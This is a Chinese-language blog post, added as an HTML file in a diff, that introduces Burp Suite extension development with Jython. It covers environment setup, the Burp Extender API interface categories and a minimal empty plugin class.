@@ -1,0 +1,951 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="Burp Extender Apis 插件开发 （一）0x01 安装环境先需要安装jython环境，下载地址https:&#x2F;&#x2F;www.jython.org&#x2F;download  下载好jython后，开始配置burpsuite，如下图所示  那么这时候就已经配置好burpsuite的jython环境和模块，只要加载py脚本即可。 0x02 Burp Extender Apis介绍下burpsuite提">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Burp Extender Apis 插件开发">
+<meta property="og:url" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/index.html">
+<meta property="og:site_name" content="一灯和尚">
+<meta property="og:description" content="Burp Extender Apis 插件开发 （一）0x01 安装环境先需要安装jython环境，下载地址https:&#x2F;&#x2F;www.jython.org&#x2F;download  下载好jython后，开始配置burpsuite，如下图所示  那么这时候就已经配置好burpsuite的jython环境和模块，只要加载py脚本即可。 0x02 Burp Extender Apis介绍下burpsuite提">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/0.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/1.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/2.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/3.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/4.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/5.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/6.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/7.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/8.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/9.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/10.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/11.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/12.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/13.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/14.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/15.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/16.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/17.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/18.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/19.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/20.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/21.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/22.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/23.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/24.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/25.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/26.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/27.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/28.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/29.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/30.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/31.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/32.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/33.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/34.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/35.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/36.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/37.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/38.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/39.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/40.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/41.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/42.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/43.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/44.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/45.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/46.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/47.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/48.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/49.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/50.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/51.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/53.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/54.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/55.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/56.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/57.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/58.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/59.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/60.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/61.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/62.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/64.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/65.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/66.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/67.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/68.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/69.jpg">
+<meta property="og:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/70.jpg">
+<meta property="article:published_time" content="2021-03-31T07:57:08.000Z">
+<meta property="article:modified_time" content="2021-04-08T18:55:17.490Z">
+<meta property="article:author" content="一灯和尚">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/0.jpg">
+
+<link rel="canonical" href="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Burp Extender Apis 插件开发 | 一灯和尚</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">一灯和尚</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">沉迷学习，无法自拔</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/mrknow001" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/46807619.jpg">
+      <meta itemprop="name" content="一灯和尚">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="一灯和尚">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Burp Extender Apis 插件开发
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-03-31 15:57:08" itemprop="dateCreated datePublished" datetime="2021-03-31T15:57:08+08:00">2021-03-31</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-04-09 02:55:17" itemprop="dateModified" datetime="2021-04-09T02:55:17+08:00">2021-04-09</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">编程学习</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="Burp-Extender-Apis-插件开发-（一）"><a href="#Burp-Extender-Apis-插件开发-（一）" class="headerlink" title="Burp Extender Apis 插件开发 （一）"></a>Burp Extender Apis 插件开发 （一）</h1><h3 id="0x01-安装环境"><a href="#0x01-安装环境" class="headerlink" title="0x01 安装环境"></a><strong>0x01 安装环境</strong></h3><p>先需要安装jython环境，下载地址<br><a target="_blank" rel="noopener" href="https://www.jython.org/download">https://www.jython.org/download</a></p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/0.jpg" alt="图片"></p>
+<p>下载好jython后，开始配置burpsuite，如下图所示</p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/1.jpg" alt="图片"></p>
+<p>那么这时候就已经配置好burpsuite的jython环境和模块，只要加载py脚本即可。</p>
+<h3 id="0x02-Burp-Extender-Apis"><a href="#0x02-Burp-Extender-Apis" class="headerlink" title="0x02 Burp Extender Apis"></a><strong>0x02 Burp Extender Apis</strong></h3><p>介绍下burpsuite提供的各个接口。burpsuite软件本身也提供了api文档</p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/2.jpg" alt="图片"></p>
+<p>也可以查看官方api地址：<a target="_blank" rel="noopener" href="https://portswigger.net/burp/extender/api/allclasses-noframe.html">https://portswigger.net/burp/extender/api/allclasses-noframe.html</a></p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/3.jpg" alt="图片"></p>
+<p>接口大致可以分为四类</p>
+<p>插件入口和帮助接口类：IBurpExtender、IBurpExtenderCallbacks、IExtensionHelpers、IExtensionStateListener</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">IBurpExtender接口类是Burp插件的入口，所有Burp的插件均需要实现此接口，并且类命名为BurpExtender。</span><br><span class="line"></span><br><span class="line">IBurpExtenderCallbacks接口类是IBurpExtender接口的实现类与Burp其他各个组件（Scanner、Intruder、Spider......）、各个通信对象（HttpRequestResponse、HttpService、SessionHandlingAction）之间的纽带。</span><br><span class="line"></span><br><span class="line">IExtensionHelpers、IExtensionStateListener这两个接口类是插件的帮助和管理操作的接口定义。</span><br></pre></td></tr></table></figure>
+
+<p>UI相关接口类：IContextMenuFactory、IContextMenuInvocation、ITab、ITextEditor、IMessageEditor、IMenuItemHandler</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这类接口类主要是定义Burp插件的UI显示和动作的处理事件，主要是软件交互中使用。</span><br></pre></td></tr></table></figure>
+
+<p>Burp工具组件接口类：IInterceptedProxyMessage、IIntruderAttack、IIntruderPayloadGenerator、IIntruderPayloadGeneratorFactory、IIntruderPayloadProcessor、IProxyListener、IScanIssue、IScannerCheck、IScannerInsertionPoint、IScannerInsertionPointProvider、IScannerListener、IScanQueueItem、IScopeChangeListener</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这些接口类的功能非常好理解，Burp在接口定义的命名中使用了的见名知意的规范，看到接口类的名称，基本就能猜测出来这个接口是适用于哪个工具组件。</span><br></pre></td></tr></table></figure>
+
+<p>HTTP消息处理接口类：ICookie、IHttpListener、IHttpRequestResponse、IHttpRequestResponsePersisted、IHttpRequestResponseWithMarkers、IHttpService、IRequestInfo、IParameter、IResponseInfo</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这些接口的定义主要是围绕HTTP消息通信过程中涉及的Cookie、Request、Response、Parameter几大消息对象，通过对通信消息头、消息体的数据处理，来达到控制HTTP消息传递的目的。</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="0x03-尝试写一个最简单的demo"><a href="#0x03-尝试写一个最简单的demo" class="headerlink" title="0x03 尝试写一个最简单的demo"></a><strong>0x03 尝试写一个最简单的demo</strong></h3><p>首先导入Burp插件的入口IBurpExtender接口类，因为后续所有的功能代码都是从该类里编写<br>from burp import IBurpExtender<br>所有Burp的插件均需要实现此接口，并且类命名为BurpExtender<br>class BurpExtender(IBurpExtender):<br>加载扩展时调用此方法。它注册IBurpExtenderCallbacks接口的实例 ，并且提供扩展可以调用的方法来执行各种操作。<br>def registerExtenderCallbacks(self, callbacks):<br>整体代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from burp import IBurpExtender</span><br><span class="line"></span><br><span class="line">class BurpExtender(IBurpExtender):</span><br><span class="line"></span><br><span class="line">def registerExtenderCallbacks(self, callbacks):</span><br><span class="line"></span><br><span class="line"># your extension code here</span><br><span class="line"></span><br><span class="line">return</span><br></pre></td></tr></table></figure>
+
+<p>这个空的扩展不执行任何操作，但是仍然可以将其加载到Burp中</p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/4.jpg" alt="图片"></p>
+<p>成功加载我们自己自定义的py插件</p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/5.jpg" alt="图片"></p>
+<p>Burp Suite使用此接口将一组回调方法传递给扩展，扩展可以使用这些回调方法在Burp中执行各种操作。加载扩展时，Burp调用其  registerExtenderCallbacks()方法并传递IBurpExtenderCallbacks接口的实例  。然后，扩展可以根据需要调用此接口的方法，以扩展Burp的功能。</p>
+<p>下面学习各个模块的触发代码以及如何生成上下文菜单</p>
+<h3 id="0x04-IBurpExtenderCallbacks"><a href="#0x04-IBurpExtenderCallbacks" class="headerlink" title="0x04 IBurpExtenderCallbacks"></a><strong>0x04 IBurpExtenderCallbacks</strong></h3><p>来看下此接口有哪些方法</p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/6.jpg" alt="图片"></p>
+<p>可以看到方法非常的多，根据自己的需求选择对应的方法。<br>setExtensionName(java.lang.String name)<br>此方法用于设置当前扩展名的显示名称，该名称将显示在扩展器工具的用户界面中。<br>self._callbacks.setExtensionName(“SQL Inject”)</p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/7.jpg" alt="图片"></p>
+<p><strong>注册功能</strong></p>
